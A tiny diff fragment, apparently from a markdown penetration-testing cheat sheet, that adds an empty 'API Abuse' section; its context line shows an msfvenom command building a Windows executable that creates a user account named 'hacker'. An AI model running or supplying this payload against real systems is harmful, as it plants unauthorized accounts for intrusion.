@@ -133,4 +133,7 @@ msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.e
 ```bash
 
 ```
-###
+### API Abuse
+```bash
+
+```
